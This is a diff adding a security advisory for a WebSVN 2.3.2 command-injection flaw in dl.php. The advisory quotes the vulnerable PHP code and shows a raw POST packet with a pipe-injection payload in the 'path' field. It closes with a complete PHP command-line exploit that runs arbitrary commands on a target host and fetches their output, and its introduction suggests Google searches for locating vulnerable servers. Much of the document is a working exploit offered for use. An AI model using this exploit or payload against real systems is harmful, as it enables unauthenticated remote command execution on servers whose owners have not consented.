@@ -1,0 +1,252 @@
+WebSVN 2.3.2 Unproper Metacharacters Escaping exec() Remote 
+Commands Injection Vulnerability
+
+tested against: Microsoft Windows Server R2 SP2 
+                PHP 5.3.6 VC9 with magic_quotes_gpc = off (default)
+                Apache 2.2.17 VC9
+
+Introduction:
+This is a very special vulnerabilty, given the incredibly high number 
+of machines involved. This can be verified by submitting the following
+queries to Google:
+
+"Powered by WebSVN * and Subversion"
+"Powered by WebSVN 2.3.2 and Subversion"
+
+homepage url: http://websvn.tigris.org/
+
+Description says:
+"WebSVN offers a view onto your subversion repositories that's been designed to 
+reflect the Subversion methodology. You can view the log of any file or directory
+and see a list of all the files changed, added or deleted in any given revision.
+You can also view compare two versions of a file so as to see exactly what was 
+changed in a particular revision.
+
+Since it's written using PHP, WebSVN is very portable and easy to install."
+
+Vulnerabilty:
+
+Without prior authentication, if the 'allowDownload' option is enabled 
+in config.php, meaning that a tarball download is allowed across all the 
+repositories (not uncommon), an attacker can invoke the dl.php script
+and passing a well formed 'path' argument to execute arbitrary
+commands against the underlying operating system.
+
+
+Vulnerable code:
+
+look at dl.php, lines 114-139:
+
+...
+} else {
+		@unlink($tempDir);
+		mkdir($tempDir);
+		// Create the name of the directory being archived
+		$archiveName = $path;
+		$isDir = (substr($archiveName, -1) == '/');
+		if ($isDir) {
+			$archiveName = substr($archiveName, 0, -1);
+		}
+		$archiveName = basename($archiveName);
+		if ($archiveName == '') {
+			$archiveName = $rep->name;
+		}
+		$plainfilename = $archiveName;
+		$archiveName .= '.r'.$rev;
+                
+		// Export the requested path from SVN repository to the temp directory
+		$svnExportResult = $svnrep->exportRepositoryPath($path, $tempDir.DIRECTORY_SEPARATOR.$archiveName, $rev, $peg);
+		
+                if ($svnExportResult != 0) {
+			header('HTTP/1.x 500 Internal Server Error', true, 500);
+			error_log('svn export failed for: '.$archiveName);
+			print 'svn export failed for "'.xml_entities($archiveName).'".';
+			removeDirectory($tempDir);
+			exit(0);
+		}
+...
+
+
+then look at exportRepositoryPath() function inside ./include/svnlook.php, lines 879-896:
+...
+// {{{ exportDirectory
+	//
+	// Exports the directory to the given location
+
+	function exportRepositoryPath($path, $filename, $rev = 0, $peg = '') {
+		$cmd = $this->svnCommandString('export', $path, $rev, $peg).' '.quote($filename); //<---------------
+		$retcode = 0;
+                
+		execCommand($cmd, $retcode); //<----------------------
+                
+		if ($retcode != 0) {
+			global $lang;
+			error_log($lang['BADCMD'].': '.escape($cmd));
+		}
+		return $retcode;
+	}
+
+	// }}}
+...
+
+again look at execCommand() function inside ./include/command.php, lines 107-123:
+
+...
+// {{{ execCommand
+
+function execCommand($cmd, &$retcode) {
+	global $config;
+
+	// On Windows machines, the whole line needs quotes round it so that it's
+	// passed to cmd.exe correctly
+	// Since php 5.3.0 the quoting seems to be done internally
+
+	if ($config->serverIsWindows && version_compare(PHP_VERSION, '5.3.0alpha') === -1) {
+		$cmd = '"'.$cmd.'"'; //<------------ nonsense ...
+	}
+
+	return @exec($cmd, $tmp, $retcode); //<--------------------- boom
+}
+
+// }}}
+...
+
+
+also, look at quote() inside ./include/command.php:
+
+...
+// {{{ quote
+//
+// Quote a string to send to the command line
+
+function quote($str) {
+	global $config;
+
+	if ($config->serverIsWindows) {
+		return '"'.$str.'"'; //<--------------------------- !!!
+	} else {
+		return escapeshellarg($str); //<------------ this should work properly on Linux instead
+	}
+}
+
+// }}}
+...
+
+
+Example packet:
+
+POST /websvn/dl.php HTTP/1.1
+User-Agent: Mozilla/4.0
+Host: 192.168.0.1
+Accept: */*
+Cookie: storedsesstemplate=.%00; storedtemplate=.%00;
+Content-Length: 42
+Content-Type: application/x-www-form-urlencoded
+
+path=./../../x%22%7Cver%3Esuntzu.txt%7C%22
+
+
+the resulting command line is like this:
+
+"c:\SVN\bin\svn" --non-interactive --config-dir C:\SVN\tmp\export "URL%20to%20repository%20%28e.g.%20file:///d:/SubVersion/proj%29./../../x%22%7Cver%3Esuntzu.txt%7C%22@" "C:\Documents and Settings
+\Administrator\Local Settings\Temp\web554.tmp\x"|ver>suntzu.txt|".r"
+
+allowing you to inject arbitrary commands via the pipe char.
+
+Proof of concept code:
+
+<?php
+/*
+  WebSVN 2.3.2 Unproper Metacharacters Escaping exec() Remote Commands Injection Exploit
+  by rgod
+
+  download url: http://websvn.tigris.org/
+
+  tested against: Microsoft Windows Server R2 SP2 
+                  PHP 5.3.6 VC9 with magic_quotes_gpc = off (default)
+                  Apache 2.2.17 VC9 
+                  
+  it needs the allowDownload option enabled in config.php, meaning
+  that a tarball download is allowed across all the repositories
+  (not uncommon)                  
+  
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage  : php 9sg_websvn.php [ip_address] [command]\r\n" );
+       print("example: php 9sg_websvn.php 192.168.0.1 ver\r\n" );
+       die();
+    }
+    
+	$argv[2] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: storedsesstemplate=.%00; storedtemplate=.%00;  ".$ck ,
+            
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0");
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 80;
+          $cmd = $argv[2];
+
+
+
+$url = "http://$host:$port/websvn/dl.php";
+$out = _s($url, 1, "", "path=./../../x".urlencode("\"|".$cmd.">suntzu.txt|\""));
+//print($out."\n");
+
+sleep(1);
+
+$url = "http://$host:$port/websvn/suntzu.txt";
+$out = _s($url, 0, "", "");
+print($out."\n");
+
+
+?>
+
